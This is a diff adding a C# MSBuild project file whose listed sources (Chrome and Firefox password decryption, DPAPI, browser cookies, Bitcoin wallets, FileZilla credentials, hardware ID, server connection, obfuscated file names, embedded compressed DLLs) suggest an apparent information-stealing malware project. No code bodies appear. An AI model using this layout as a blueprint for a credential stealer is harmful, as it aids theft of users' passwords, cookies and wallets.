@@ -1,0 +1,124 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="14.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{06980867-F9AB-4666-9A49-A84DE2F1F2C0}</ProjectGuid>
+    <OutputType>Library</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>DJinglw</RootNamespace>
+    <AssemblyName>DJinglw</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System.Core" />
+    <Reference Include="Omdageraaa">
+      <HintPath>..\..\Omdageraaa.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Management" />
+    <Reference Include="WMIGatherer" />
+    <Reference Include="System.ServiceModel" />
+    <Reference Include="System.Web.Extensions" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Data.SQLite" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="-Module-.cs" />
+    <Compile Include="Costura\AssemblyLoader.cs" />
+    <Compile Include="Decrypt\Asn1Der.cs" />
+    <Compile Include="Decrypt\Asn1DerObject.cs" />
+    <Compile Include="Decrypt\BerkeleyDB.cs" />
+    <Compile Include="Decrypt\ByteHelper.cs" />
+    <Compile Include="Decrypt\Chrome.cs" />
+    <Compile Include="Decrypt\FireFox.cs" />
+    <Compile Include="Decrypt\IPasswordDecrypter.cs" />
+    <Compile Include="Decrypt\Login.cs" />
+    <Compile Include="Decrypt\MozillaPBE.cs" />
+    <Compile Include="Decrypt\PasswordCheck.cs" />
+    <Compile Include="Decrypt\RootObject.cs" />
+    <Compile Include="Decrypt\TripleDESHelper.cs" />
+    <Compile Include="Dodjins\AllInfo.cs" />
+    <Compile Include="Dodjins\AvaliableTask.cs" />
+    <Compile Include="Dodjins\bbbrrooowser.cs" />
+    <Compile Include="Dodjins\Callbacie81ks.cs" />
+    <Compile Include="Dodjins\clripwmai2.cs" />
+    <Compile Include="Dodjins\Connection.cs" />
+    <Compile Include="Dodjins\ddleuwja.cs" />
+    <Compile Include="Dodjins\Dominatroer.cs" />
+    <Compile Include="Dodjins\eod91kk.cs" />
+    <Compile Include="Dodjins\Extention.cs" />
+    <Compile Include="Dodjins\fdddddd.cs" />
+    <Compile Include="Dodjins\FileZilla3.cs" />
+    <Compile Include="Dodjins\fornau2.cs" />
+    <Compile Include="Dodjins\HWID.cs" />
+    <Compile Include="Dodjins\IConnector.cs" />
+    <Compile Include="Dodjins\Mrazilia.cs" />
+    <Compile Include="Dodjins\Pass.cs" />
+    <Compile Include="Dodjins\qqqqqqqq.cs" />
+    <Compile Include="Dodjins\RecentServers.cs" />
+    <Compile Include="Dodjins\Resources.Designer.cs">
+      <DependentUpon>Resources.resx</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <Compile Include="Dodjins\Server.cs" />
+    <Compile Include="Dodjins\stataken.cs" />
+    <Compile Include="Dodjins\TaskStatus.cs" />
+    <Compile Include="Dodjins\TextFile.cs" />
+    <Compile Include="DPAPI.cs" />
+    <Compile Include="MainModule\Classes\BitcoinWallet.cs" />
+    <Compile Include="MainModule\Classes\BrowserCookie.cs" />
+    <Compile Include="MainModule\Classes\Log.cs" />
+    <Compile Include="MainModule\Classes\NetInfo.cs" />
+    <Compile Include="MainModule\Classes\PasswordContainer.cs" />
+    <Compile Include="MainModule\Classes\ProcessInfo.cs" />
+    <Compile Include="MainModule\Classes\SubInfo.cs" />
+    <Compile Include="MainModule\Classes\UserLog.cs" />
+    <Compile Include="MainModule\FileInformation.cs" />
+    <Compile Include="MainModule\FileManager.cs" />
+    <Compile Include="MainModule\FileType.cs" />
+    <Compile Include="ProcessedByFody.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Costura\omdageraaa\dll.compressed" />
+    <EmbeddedResource Include="Costura\omdageraaa\pdb.compressed" />
+    <EmbeddedResource Include="Costura\system\data\sqlite\dll.compressed" />
+    <EmbeddedResource Include="Costura\wmigatherer\dll.compressed" />
+    <EmbeddedResource Include="Costura\wmigatherer\pdb.compressed" />
+    <EmbeddedResource Include="Dodjins\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
